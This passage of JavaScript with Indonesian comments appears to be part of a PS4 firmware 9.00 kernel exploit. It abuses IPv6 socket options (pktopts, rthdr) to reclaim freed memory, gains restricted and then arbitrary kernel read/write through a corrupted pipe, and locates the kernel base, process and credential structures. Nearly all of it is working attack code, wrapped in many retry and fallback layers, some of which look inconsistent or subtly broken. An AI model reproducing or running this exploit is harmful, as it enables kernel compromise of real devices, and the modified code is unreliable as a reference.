                log(`Error during cleanup: ${e.message}`);
            }

            // Update status
            updateUIStatus('error', 'Timeout saat melakukan overwrite main pktopts. Silakan refresh halaman.');
        }, timeoutMs);

        // Tambahkan delay awal untuk stabilitas
        sleep(300); // Tingkatkan dari 200 ke 300

        let reclaim_sd = null;
        close(pktopts_sds[1]);

        // Bersihkan memori sebelum memulai
        cleanupCorruptPointers();

        // Tambahkan delay setelah pembersihan memori
        sleep(200);

        // Tambahkan variasi pada socket untuk meningkatkan kemungkinan berhasil
        const socketVariations = [
            { delay: 0, offset: 0 },
            { delay: 10, offset: 1 },
            { delay: 20, offset: 2 },
            { delay: 30, offset: 3 },
            { delay: 40, offset: 4 }
        ];

        // Pilih variasi socket secara acak
        const variation = socketVariations[Math.floor(Math.random() * socketVariations.length)];
        log(`Using socket variation with delay: ${variation.delay}, offset: ${variation.offset}`);

        // Loop untuk retry
        for (let retry = 0; retry < maxRetries; retry++) {
            try {
                log(`Retry ${retry + 1}/${maxRetries} for overwrite main pktopts`);

                // Tambahkan delay yang meningkat dengan setiap retry
                sleep(150 * (retry + 1)); // Tingkatkan dari 100 ke 150

                // Tambahkan variasi pada socket yang digunakan
                const psdOffset = (retry + variation.offset) % pktopts_sds.length;
                const currentPsd = pktopts_sds[psdOffset];
                log(`Using psd with offset ${psdOffset} for this retry`);

                // Validasi socket sebelum digunakan
                if (!isValidSocket(currentPsd)) {
                    log(`Socket dengan offset ${psdOffset} tidak valid, menggunakan psd default`);
                    // Gunakan psd default jika currentPsd tidak valid
                } else {
                    log(`Socket dengan offset ${psdOffset} valid, menggunakan untuk overwrite`);
                    // Gunakan currentPsd yang sudah divalidasi untuk operasi berikutnya
                    psd = currentPsd;
                }

                // Coba overwrite main pktopts
                for (let i = 0; i < num_alias; i++) {
                    // Log progress
                    if (i % 3 === 0) { // Tingkatkan frekuensi logging dari 5 ke 3
                        log(`Overwrite attempt ${i}/${num_alias}`);
                    }

                    // Tambahkan delay kecil setiap 3 iterasi
                    if (i > 0 && i % 3 === 0) {
                        sleep(30 + variation.delay); // Tingkatkan dari 20 ke 30 + variasi
                    }

                    for (let j = 0; j < num_sds; j++) {
                        try {
                            // if a socket doesn't have a pktopts, setting the rthdr will make
                            // one. the new pktopts might reuse the memory instead of the
                            // rthdr. make sure the sockets already have a pktopts before
                            pktopts.write32(off_tclass, 0x4141 | j << 16);
                            set_rthdr(sds[j], pktopts, rsize);
                        } catch (e) {
                            log(`Error setting rthdr for socket ${j}: ${e.message}`);
                            // Lanjutkan ke socket berikutnya
                        }
                    }

                    try {
                        gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
                        const marker = tclass[0];
                        if ((marker & 0xffff) === 0x4141) {
                            log(`found reclaim sd at attempt: ${i} (retry ${retry + 1})`);
                            const idx = marker >>> 16;
                            if (idx < sds.length) {
                                reclaim_sd = sds[idx];
                                sds.splice(idx, 1);
                                return reclaim_sd; // Berhasil
                            } else {
                                log(`Invalid index ${idx} (length: ${sds.length})`);
                            }
                        }
                    } catch (e) {
                        log(`Error getting socket option: ${e.message}`);
                    }
                }

                // Jika kita sampai di sini, kita tidak menemukan reclaim_sd
                // Coba reset beberapa socket untuk retry berikutnya
                log("Resetting sockets for next retry...");
                const reset_count = Math.min(20, sds.length);
                for (let i = 0; i < reset_count; i++) {
                    try {
                        setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
                    } catch (e) {
                        // Abaikan error
                    }
                }

                // Tambahkan beberapa socket baru untuk retry berikutnya
                if (retry < maxRetries - 1) {
                    log("Adding new sockets for next retry...");
                    for (let i = 0; i < 5; i++) {
                        sds.push(new_socket());
                    }
                }
            } catch (e) {
                log(`Error during retry ${retry + 1}: ${e.message}`);
            }
        }

        // Bersihkan timeout
        clearTimeout(timeoutId);

        return null; // Gagal setelah semua retry
    }

    // Coba overwrite main pktopts dengan retry
    let reclaim_sd = overwriteMainPktopts(5); // Tingkatkan dari 3 ke 5

    // Jika gagal, coba pendekatan alternatif
    if (reclaim_sd === null) {
        log("Standard approach failed. Trying alternative approach...");

        // Buat socket baru untuk pendekatan alternatif
        const new_sds = [];
        for (let i = 0; i < 30; i++) { // Tingkatkan dari 20 ke 30
            new_sds.push(new_socket());
        }

        // Tambahkan socket baru ke sds
        sds.push(...new_sds);

        // Tambahkan delay sebelum mencoba pendekatan alternatif
        sleep(500);

        // Coba lagi dengan pendekatan alternatif
        reclaim_sd = overwriteMainPktopts(3); // Tingkatkan dari 2 ke 3
    }

    // Jika masih gagal, gunakan fallback yang ditingkatkan
    if (reclaim_sd === null) {
        log("Alternative approach failed. Using improved fallback...");

        // Panggil fungsi untuk membersihkan memori sebelum mencoba fallback
        cleanupCorruptPointers();

        // Tambahkan delay yang lebih panjang
        sleep(1000);

        // Coba deteksi dan tangani potensi Kernel Panic
        log("Checking for potential Kernel Panic conditions...");
        try {
            // Periksa apakah ada tanda-tanda Kernel Panic
            const firmware = detectFirmware();
            log(`Current firmware: ${firmware}`);

            if (firmware === '9.00') {
                log("Firmware 9.00 detected - applying special handling for stability");
                // Tambahkan penanganan khusus untuk firmware 9.00
                updateUIStatus('warning', 'Menerapkan penanganan khusus untuk firmware 9.00...');
                sleep(500);
            }
        } catch (e) {
            log(`Error during firmware check: ${e.message}`);
        }

        // Buat socket baru khusus untuk fallback
        log("Creating new sockets specifically for fallback...");
        const fallback_sds = [];
        for (let i = 0; i < 30; i++) { // Tingkatkan dari 20 ke 30
            fallback_sds.push(new_socket());
        }

        // Siapkan socket baru dengan pktopts
        log("Preparing fallback sockets with pktopts...");
        for (let i = 0; i < fallback_sds.length; i++) {
            try {
                const tclass = new Word(0x4141 | i << 16);
                ssockopt(fallback_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
            } catch (e) {
                // Abaikan error
            }
        }

        // Tambahkan delay untuk stabilitas
        sleep(200);

        // Coba temukan socket yang valid dari fallback_sds
        log("Searching for valid socket in fallback sockets...");
        let found_valid = false;

        for (let i = 0; i < fallback_sds.length; i++) {
            try {
                const test_tclass = new Word();
                gsockopt(fallback_sds[i], IPPROTO_IPV6, IPV6_TCLASS, test_tclass);
                log(`Fallback socket ${i} validation: 0x${test_tclass[0].toString(16)}`);

                // Gunakan socket ini sebagai fallback
                reclaim_sd = fallback_sds[i];
                found_valid = true;
                log(`Using validated fallback socket: ${reclaim_sd}`);
                break;
            } catch (e) {
                // Lanjutkan ke socket berikutnya
            }
        }

        // Jika tidak menemukan socket valid, gunakan socket pertama
        if (!found_valid) {
            if (fallback_sds.length > 0) {
                reclaim_sd = fallback_sds[0];
                log(`Using first fallback socket: ${reclaim_sd}`);
            } else if (sds.length > 0) {
                reclaim_sd = sds[0];
                sds.splice(0, 1);
                log(`Using original socket as fallback: ${reclaim_sd}`);
            } else {
                die('failed to overwrite main pktopts - no sockets available');
            }
        }

        // Validasi socket fallback sebelum digunakan
        if (reclaim_sd !== null) {
            // Tambahkan delay sebelum validasi
            sleep(100);

            // Gunakan fungsi isValidSocket untuk validasi
            if (isValidSocket(reclaim_sd)) {
                log("Final fallback socket validation successful");
            } else {
                log("Warning: Final fallback socket validation failed");

                // Coba cari socket valid lain sebagai upaya terakhir
                log("Trying to find another valid socket as last resort...");

                let foundValidSocket = false;

                // Coba semua socket yang tersisa
                for (let i = 0; i < fallback_sds.length; i++) {
                    if (fallback_sds[i] !== reclaim_sd && isValidSocket(fallback_sds[i])) {
                        reclaim_sd = fallback_sds[i];
                        log(`Found valid socket as last resort: ${reclaim_sd}`);
                        foundValidSocket = true;
                        break;
                    }
                }

                if (!foundValidSocket) {
                    log("Warning: Could not find any valid socket as last resort");
                    // Tetap gunakan socket ini, karena ini adalah upaya terakhir
                }
            }
        }
    }

    const pktinfo = new Buffer(0x14);
    pktinfo.write64(0, pktinfo_p);
    const nhop = new Word();
    const nhop_p = nhop.addr;
    const read_buf = new Buffer(8);
    const read_buf_p = read_buf.addr;
    function kread64(addr) {
        const len = 8;
        let offset = 0;
        while (offset < len) {
            // pktopts.ip6po_nhinfo = addr + offset
            pktinfo.write64(8, addr.add(offset));
            nhop[0] = len - offset;

            ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
            sysi(
                'getsockopt',
                psd, IPPROTO_IPV6, IPV6_NEXTHOP,
                read_buf_p.add(offset), nhop_p,
            );

            const n = nhop[0];
            if (n === 0) {
                read_buf[offset] = 0;
                offset += 1;
            } else {
                offset += n;
            }
        }
        return read_buf.read64(0);
    }

    // Test read dengan mekanisme recovery yang lebih robust
    let test_read = null;
    let kstr = '';
    let test_read_success = false;

    // Tambahkan retry untuk test read
    for (let retry = 0; retry < 5; retry++) { // Tingkatkan dari 3 ke 5
        try {
            log(`Test read attempt ${retry + 1}/5...`);

            // Tambahkan delay yang meningkat dengan setiap retry
            sleep(200 * (retry + 1)); // Tingkatkan dari 100 ke 200

            // Bersihkan memori sebelum test read
            cleanupCorruptPointers();

            // Tambahkan delay setelah pembersihan memori
            sleep(100);

            // Coba baca kernel memory dengan beberapa variasi alamat
            // Pada firmware 9.00, alamat kernel bisa sedikit bergeser
            const addr_variations = [
                kernel_addr,
                kernel_addr - 8,
                kernel_addr + 8,
                kernel_addr - 16,
                kernel_addr + 16
            ];

            // Coba setiap variasi alamat
            for (let i = 0; i < addr_variations.length; i++) {
                try {
                    const curr_addr = addr_variations[i];
                    if (i > 0) {
                        log(`Trying address variation ${i}: offset ${(curr_addr - kernel_addr)}`);
                    }

                    // Coba baca kernel memory
                    test_read = kread64(curr_addr);
                    log(`kread64(variation ${i}): ${test_read}`);
                    kstr = jstr(read_buf);
                    log(`*(variation ${i}): ${kstr}`);

                    // Jika berhasil, keluar dari loop
                    if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
                        log(`Test read successful on attempt ${retry + 1}, variation ${i}`);
                        kernel_addr = curr_addr; // Update alamat kernel jika berhasil
                        test_read_success = true;
                        break;
                    }
                } catch (e) {
                    log(`Error during address variation ${i}: ${e.message}`);
                    // Lanjutkan ke variasi berikutnya
                }
            }

            // Jika berhasil dengan salah satu variasi, keluar dari loop retry
            if (test_read_success) {
                break;
            }
        } catch (e) {
            log(`Error during test read attempt ${retry + 1}: ${e.message}`);

            // Tambahkan delay sebelum mencoba lagi
            sleep(300); // Tingkatkan dari 200 ke 300
        }
    }

    // Jika test read gagal, coba mekanisme recovery yang lebih agresif
    if (!test_read_success) {
        log(`Test read failed, trying advanced recovery mechanism...`);

        // Coba reset semua socket dan pktopts
        try {
            // Bersihkan memori
            cleanupCorruptPointers();

            // Tambahkan delay yang lebih panjang
            sleep(500);

            // Buat socket baru untuk recovery
            const recovery_sds = [];
            for (let i = 0; i < 10; i++) {
                recovery_sds.push(new_socket());
            }
            log(`Created ${recovery_sds.length} recovery sockets`);

            // Coba setup pktopts baru
            for (let i = 0; i < recovery_sds.length; i++) {
                try {
                    const tclass = new Word(0xdead | i << 16);
                    ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
                } catch (e) {
                    // Abaikan error
                }
            }

            // Tambahkan delay
            sleep(200);

            // Coba lagi test read dengan socket baru
            for (let i = 0; i < recovery_sds.length; i++) {
                try {
                    // Gunakan socket ini untuk setup
                    main_sd = recovery_sds[i];

                    // Coba baca kernel memory lagi
                    test_read = kread64(kernel_addr);
                    kstr = jstr(read_buf);

                    if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
                        log(`Advanced recovery successful with socket ${i}`);
                        test_read_success = true;
                        break;
                    }
                } catch (e) {
                    // Abaikan error
                }
            }
        } catch (e) {
            log(`Error during advanced recovery: ${e.message}`);
        }
    }

    // Verifikasi hasil test read dan lanjutkan atau coba recovery
    if (!test_read_success && kstr !== 'evf cv') {
        log("Test read failed, trying enhanced recovery mechanism...");

        // Tambahkan delay untuk stabilitas
        sleep(300); // Tingkatkan dari 200 ke 300

        // Coba recovery dengan pendekatan alternatif yang lebih robust
        try {
            log("Enhanced recovery attempt 1: Resetting pktopts and trying again");

            // Bersihkan memori
            cleanupCorruptPointers();

            // Reset pktopts
            setsockopt(psd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

            // Tambahkan delay
            sleep(200); // Tingkatkan dari 100 ke 200

            // Buat socket baru untuk recovery
            const recovery_sd = new_socket();
            log(`Created recovery socket: ${recovery_sd}`);

            // Siapkan socket dengan pktopts
            const tclass = new Word(0xbeef);
            ssockopt(recovery_sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);

            // Tambahkan delay
            sleep(100); // Tingkatkan dari 50 ke 100

            // Coba lagi dengan socket baru dan variasi alamat kernel
            // Pada firmware 9.00, alamat kernel bisa sedikit bergeser
            const addr_variations = [
                kernel_addr,
                kernel_addr - 8,
                kernel_addr + 8,
                kernel_addr - 16,
                kernel_addr + 16
            ];

            // Coba setiap variasi alamat
            for (let i = 0; i < addr_variations.length; i++) {
                try {
                    const curr_addr = addr_variations[i];
                    if (i > 0) {
                        log(`Trying address variation ${i}: offset ${(curr_addr - kernel_addr)}`);
                    }

                    // Coba lagi dengan socket baru
                    pktinfo.write64(0, curr_addr);
                    ssockopt(recovery_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);

                    // Tambahkan delay
                    sleep(50);

                    // Coba baca lagi
                    gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
                    kstr = jstr(read_buf);
                    log(`Enhanced recovery read 1 (variation ${i}): ${kstr}`);

                    // Jika berhasil, keluar dari loop
                    if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
                        log(`Enhanced recovery successful on variation ${i}`);
                        kernel_addr = curr_addr; // Update alamat kernel jika berhasil
                        test_read_success = true;
                        break;
                    }
                } catch (e) {
                    log(`Error during address variation ${i}: ${e.message}`);
                    // Lanjutkan ke variasi berikutnya
                }
            }

            // Jika masih gagal, coba pendekatan kedua yang lebih agresif
            if (!test_read_success) {
                log("Enhanced recovery attempt 1 failed, trying second approach");

                // Bersihkan memori lagi
                cleanupCorruptPointers();

                // Tambahkan delay yang lebih panjang
                sleep(500);

                // Buat lebih banyak socket baru
                const recovery_sds = [];
                for (let i = 0; i < 10; i++) { // Tingkatkan dari 5 ke 10
                    recovery_sds.push(new_socket());
                }
                log(`Created ${recovery_sds.length} recovery sockets`);

                // Siapkan socket dengan pktopts
                for (let i = 0; i < recovery_sds.length; i++) {
                    try {
                        const tclass = new Word(0xdead | i << 16);
                        ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
                    } catch (e) {
                        log(`Error setting tclass for socket ${i}: ${e.message}`);
                    }
                }

                // Tambahkan delay
                sleep(200); // Tingkatkan dari 100 ke 200

                // Coba dengan setiap socket dan variasi alamat
                for (let i = 0; i < recovery_sds.length; i++) {
                    // Validasi socket sebelum digunakan
                    if (!isValidSocket(recovery_sds[i])) {
                        log(`Socket ${i} tidak valid, melewati`);
                        continue;
                    }

                    // Coba setiap variasi alamat
                    for (let j = 0; j < addr_variations.length; j++) {
                        try {
                            const curr_addr = addr_variations[j];

                            pktinfo.write64(0, curr_addr);
                            ssockopt(recovery_sds[i], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
                            gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
                            kstr = jstr(read_buf);
                            log(`Enhanced recovery read 2 (socket ${i}, variation ${j}): ${kstr}`);

                            if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
                                log(`Enhanced recovery successful with socket ${i}, variation ${j}`);
                                kernel_addr = curr_addr; // Update alamat kernel jika berhasil
                                test_read_success = true;
                                break;
                            }
                        } catch (e) {
                            log(`Error with recovery socket ${i}, variation ${j}: ${e.message}`);
                        }
                    }

                    // Jika berhasil, keluar dari loop
                    if (test_read_success) {
                        break;
                    }
                }

                // Jika masih gagal, coba pendekatan terakhir dengan alamat kernel yang berbeda
                if (!test_read_success) {
                    log("Enhanced recovery attempt 2 failed, trying last resort approach");

                    // Bersihkan memori sekali lagi
                    cleanupCorruptPointers();

                    // Tambahkan delay yang sangat panjang
                    sleep(1000);

                    // Coba pendekatan alternatif dengan alamat kernel yang berbeda
                    // Pada firmware 9.00, string "evf cv" bisa berada di lokasi yang berbeda
                    // Gunakan BigInt untuk alamat kernel yang besar
                    const base_addr = BigInt("0xffffffffd345af00");
                    const alternative_addrs = [
                        base_addr,                    // Base address
                        base_addr + BigInt(32),       // +32 bytes
                        base_addr + BigInt(64),       // +64 bytes
                        base_addr - BigInt(256),      // -256 bytes
                        base_addr + BigInt(256)       // +256 bytes
                    ];

                    log("Trying alternative kernel addresses as last resort...");

                    // Buat socket baru untuk pendekatan terakhir
                    const last_resort_sd = new_socket();
                    log(`Created last resort socket: ${last_resort_sd}`);

                    // Siapkan socket dengan pktopts
                    const tclass = new Word(0xface);
                    ssockopt(last_resort_sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);

                    // Tambahkan delay
                    sleep(200);

                    // Coba setiap alamat alternatif
                    for (let i = 0; i < alternative_addrs.length; i++) {
                        try {
                            const alt_addr = alternative_addrs[i];
                            log(`Trying alternative address ${i}: ${alt_addr.toString(16)}`);

                            // Konversi BigInt ke Number untuk kompatibilitas
                            // Catatan: Ini aman karena kita hanya menggunakan alamat ini untuk operasi internal
                            const alt_addr_num = Number(alt_addr);

                            // Coba baca kernel memory
                            pktinfo.write64(0, alt_addr_num);
                            ssockopt(last_resort_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
                            gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
                            kstr = jstr(read_buf);
                            log(`Last resort read ${i}: ${kstr}`);

                            // Jika berhasil, keluar dari loop
                            if (kstr === 'evf cv' || kstr.includes('evf') || kstr.includes('cv')) {
                                log(`Last resort successful with alternative address ${i}`);
                                kernel_addr = alt_addr_num; // Update alamat kernel
                                test_read_success = true;
                                break;
                            }
                        } catch (e) {
                            log(`Error during alternative address ${i}: ${e.message}`);
                            // Lanjutkan ke alamat berikutnya
                        }
                    }
                }

                if (!test_read_success) {
                    throw new Error("All enhanced recovery attempts failed");
                }
            }

            log("Enhanced recovery successful");
        } catch (e) {
            log(`Enhanced recovery attempts failed: ${e.message}`);
            die('test read of &"evf cv" failed after all recovery attempts');
        }
    }

    // Log hasil akhir test read
    log(`Final test read result: ${kstr}`);
    log(`Test read ${test_read_success ? 'successful' : 'failed'}`);

    // Jika berhasil tapi tidak persis "evf cv", berikan peringatan
    if (test_read_success && kstr !== 'evf cv') {
        log(`Warning: Test read returned "${kstr}" instead of "evf cv", but continuing anyway`);
    }

    // Only For PS4 9.00

    const off_kstr = 0x7f6f27;
    const kbase = kernel_addr.sub(off_kstr);
    log(`kernel base: ${kbase}`);

    log('\nmaking arbitrary kernel read/write');
    const cpuid = 7 - main_core;
    const off_cpuid_to_pcpu = 0x21ef2a0;
    const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
    log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
    const pcpu = kread64(pcpu_p);
    log(`pcpu: ${pcpu}`);
    log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
    // __pcpu[cpuid].pc_curthread
    const td = kread64(pcpu);
    log(`td: ${td}`);

    const off_td_proc = 8;
    const proc = kread64(td.add(off_td_proc));
    log(`proc: ${proc}`);
    const pid = sysi('getpid');
    log(`our pid: ${pid}`);
    const pid2 = kread64(proc.add(0xb0)).lo;
    log(`suspected proc pid: ${pid2}`);
    if (pid2 !== pid) {
        die('process not found');
    }

    const off_p_fd = 0x48;
    const p_fd = kread64(proc.add(off_p_fd));
    log(`proc.p_fd: ${p_fd}`);
    // curthread->td_proc->p_fd->fd_ofiles
    const ofiles = kread64(p_fd);
    log(`ofiles: ${ofiles}`);

    const off_p_ucred = 0x40;
    const p_ucred = kread64(proc.add(off_p_ucred));
    log(`p_ucred ${p_ucred}`);

    const pipes = new View4(2);
    sysi('pipe', pipes.addr);
    const pipe_file = kread64(ofiles.add(pipes[0] * 8));
    log(`pipe file: ${pipe_file}`);
    // ofiles[pipe_fd].f_data
    const kpipe = kread64(pipe_file);
    log(`pipe pointer: ${kpipe}`);

    const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
    for (let off = 0; off < pipe_save.size; off += 8) {
        pipe_save.write64(off, kread64(kpipe.add(off)));
    }

    const main_sd = psd;
    const worker_sd = dirty_sd;

    const main_file = kread64(ofiles.add(main_sd * 8));
    log(`main sock file: ${main_file}`);
    // ofiles[sd].f_data
    const main_sock = kread64(main_file);
    log(`main sock pointer: ${main_sock}`);
    // socket.so_pcb (struct inpcb *)
    const m_pcb = kread64(main_sock.add(0x18));
    log(`main sock pcb: ${m_pcb}`);
    // inpcb.in6p_outputopts
    const m_pktopts = kread64(m_pcb.add(0x118));
    log(`main pktopts: ${m_pktopts}`);
    log(`0x100 malloc zone pointer: ${k100_addr}`);

    if (m_pktopts.ne(k100_addr)) {
        die('main pktopts pointer != leaked pktopts pointer');
    }

    // ofiles[sd].f_data
    const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
    log(`reclaim sock pointer: ${reclaim_sock}`);
    // socket.so_pcb (struct inpcb *)
    const r_pcb = kread64(reclaim_sock.add(0x18));
    log(`reclaim sock pcb: ${r_pcb}`);
    // inpcb.in6p_outputopts
    const r_pktopts = kread64(r_pcb.add(0x118));
    log(`reclaim pktopts: ${r_pktopts}`);

    // ofiles[sd].f_data
    const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
    log(`worker sock pointer: ${worker_sock}`);
    // socket.so_pcb (struct inpcb *)
    const w_pcb = kread64(worker_sock.add(0x18));
    log(`worker sock pcb: ${w_pcb}`);
    // inpcb.in6p_outputopts
    const w_pktopts = kread64(w_pcb.add(0x118));
    log(`worker pktopts: ${w_pktopts}`);

    // Fungsi untuk mencoba setup kernel read/write dengan retry
    function setupKernelRW(maxRetries = 3) {
        log(`Attempting to setup kernel read/write with ${maxRetries} retries...`);

        // Deteksi dan tangani potensi Kernel Panic secara proaktif
        detectPotentialKP();

        // Tambahkan pembersihan memori tambahan
        cleanupCorruptPointers();

        // Tambahkan delay untuk stabilitas
        sleep(500);

        for (let retry = 0; retry < maxRetries; retry++) {
            try {
                log(`Retry ${retry + 1}/${maxRetries} for setup kernel read/write`);

                // Tambahkan delay yang meningkat dengan setiap retry
                sleep(100 * (retry + 1)); // Tingkatkan dari 50 ke 100

                // get restricted read/write with pktopts pair
                // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
                const w_pktinfo = w_pktopts.add(0x10);
                pktinfo.write64(0, w_pktinfo);
                pktinfo.write64(8, 0); // clear .ip6po_nexthop

                log(`Setting up pktinfo pointer: ${w_pktinfo}`);
                ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);

                // Tambahkan delay kecil
                sleep(20);

                log(`Setting up kernel read target: ${kernel_addr}`);
                pktinfo.write64(0, kernel_addr);
                ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);

                // Tambahkan delay kecil
                sleep(20);

                log("Reading kernel memory...");
                gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
                const kstr2 = jstr(pktinfo);
                log(`*(&"evf cv"): ${kstr2}`);

                if (kstr2 === 'evf cv') {
                    log(`Kernel read/write setup successful on retry ${retry + 1}`);
                    return true;
                } else {
                    log(`Kernel read failed on retry ${retry + 1}: got "${kstr2}" instead of "evf cv"`);
                }
            } catch (e) {
                log(`Error during retry ${retry + 1}: ${e.message}`);
            }

            // Jika gagal dan masih ada retry tersisa, coba reset
            if (retry < maxRetries - 1) {
                try {
                    log("Resetting pktopts for next retry...");
                    setsockopt(main_sd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
                    sleep(100);
                } catch (e) {
                    log(`Error resetting pktopts: ${e.message}`);
                }
            }
        }

        return false;
    }

    // Coba setup kernel read/write dengan retry
    if (!setupKernelRW(5)) { // Tingkatkan dari 3 ke 5
        log("Standard approach failed. Trying alternative approach...");

        // Coba pendekatan alternatif
        try {
            // Bersihkan memori sebelum mencoba pendekatan alternatif
            cleanupCorruptPointers();

            // Tambahkan delay yang lebih panjang
            sleep(500);

            // Buat beberapa socket baru untuk pendekatan alternatif
            const alt_sds = [];
            for (let i = 0; i < 5; i++) {
                alt_sds.push(new_socket());
            }
            log(`Created ${alt_sds.length} alternative sockets`);

            // Siapkan socket dengan pktopts
            for (let i = 0; i < alt_sds.length; i++) {
                try {
                    const tclass = new Word(0xcafe | i << 16);
                    ssockopt(alt_sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
                } catch (e) {
                    log(`Error setting tclass for socket ${i}: ${e.message}`);
                }
            }

            // Tambahkan delay
            sleep(200);

            // Validasi socket sebelum digunakan
            let validSocketFound = false;
            let validSocket = null;

            for (let i = 0; i < alt_sds.length; i++) {
                if (isValidSocket(alt_sds[i])) {
                    validSocket = alt_sds[i];
                    validSocketFound = true;
                    log(`Found valid alternative socket: ${validSocket}`);
                    break;
                }
            }

            if (!validSocketFound) {
                log("No valid alternative socket found, using first socket");
                validSocket = alt_sds[0];
            }

            // Coba lagi dengan socket baru
            if (!setupKernelRW(3)) { // Tingkatkan dari 2 ke 3
                // Coba pendekatan terakhir dengan socket yang berbeda
                log("Alternative approach failed. Trying last resort approach...");

                // Bersihkan memori lagi
                cleanupCorruptPointers();

                // Tambahkan delay yang lebih panjang
                sleep(1000);

                // Coba dengan socket yang berbeda
                for (let i = 0; i < alt_sds.length; i++) {
                    if (alt_sds[i] !== validSocket && isValidSocket(alt_sds[i])) {
                        log(`Trying last resort with socket ${i}`);

                        // Gunakan socket ini untuk setup
                        main_sd = alt_sds[i];

                        // Coba setup lagi
                        if (setupKernelRW(2)) {
                            log("Last resort approach successful");
                            break;
                        }
                    }
                }

                // Jika masih gagal, menyerah
                die('pktopts read failed after all attempts');
            }
        } catch (e) {
            log(`Error during alternative approach: ${e.message}`);
            die('pktopts read failed');
        }
    }

    log('achieved restricted kernel read/write');

    // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
    // using pktopts write. we can safely modify a pipe even with this limit so
    // we corrupt that instead for arbitrary read/write. pipe.pipe_map will be
    // clobbered with zeros but that's okay
    class KernelMemory {
        constructor(main_sd, worker_sd, pipes, pipe_addr) {
            this.main_sd = main_sd;
            this.worker_sd = worker_sd;
            this.rpipe = pipes[0];
            this.wpipe = pipes[1];
            this.pipe_addr = pipe_addr; // &pipe.pipe_buf
            this.pipe_addr2 = pipe_addr.add(0x10); // &pipe.pipe_buf.buffer
            this.rw_buf = new Buffer(0x14);
            this.addr_buf = new Buffer(0x14);
            this.data_buf = new Buffer(0x14);
            this.data_buf.write32(0xc, 0x40000000);
        }

        _verify_len(len) {
            if (!(Number.isInteger(len) && (0 <= len <= 0xffffffff))) {
                throw TypeError('len not a 32-bit unsigned integer');
            }
        }

        copyin(src, dst, len) {
            this._verify_len(len);
            const main = this.main_sd;
            const worker = this.worker_sd;
            const addr_buf = this.addr_buf;
            const data_buf = this.data_buf;

            addr_buf.write64(0, this.pipe_addr);
            ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

            data_buf.write64(0, 0);
            ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);

            addr_buf.write64(0, this.pipe_addr2);
            ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

            addr_buf.write64(0, dst);
            ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

            sysi('write', this.wpipe, src, len);
        }

        copyout(src, dst, len) {
            this._verify_len(len);
            const main = this.main_sd;
            const worker = this.worker_sd;
            const addr_buf = this.addr_buf;
            const data_buf = this.data_buf;

            addr_buf.write64(0, this.pipe_addr);
            ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

            data_buf.write32(0, 0x40000000);
            ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);

            addr_buf.write64(0, this.pipe_addr2);
            ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

            addr_buf.write64(0, src);
            ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);

            sysi('read', this.rpipe, dst, len);
        }

        _read(addr) {
            const buf = this.rw_buf;
            buf.write64(0, addr);
            buf.fill(0, 8);
            ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
            gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
        }

        read32(addr) {
            this._read(addr);
            return this.rw_buf.read32(0);
        }

        read64(addr) {
            this._read(addr);
            return this.rw_buf.read64(0);
        }

        write32(addr, value) {
            this.rw_buf.write32(0, value);
            this.copyin(this.rw_buf.addr, addr, 4);
        }

        write64(addr, value) {
            this.rw_buf.write64(0, value);
            this.copyin(this.rw_buf.addr, addr, 8);
        }
    }
    const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);

    const kstr3_buf = new Buffer(8);
    kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
    const kstr3 = jstr(kstr3_buf);
    log(`*(&"evf cv"): ${kstr3}`);
    if (kstr3 !== 'evf cv') {
        die('pipe read failed');
    }
    log('achieved arbitrary kernel read/write');

    // RESTORE: clean corrupt pointers
    // pktopts.ip6po_rthdr = NULL
    const off_ip6po_rthdr = 0x68;
    const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
    log(`reclaim rthdr: ${kmem.read64(r_rthdr_p)}`);
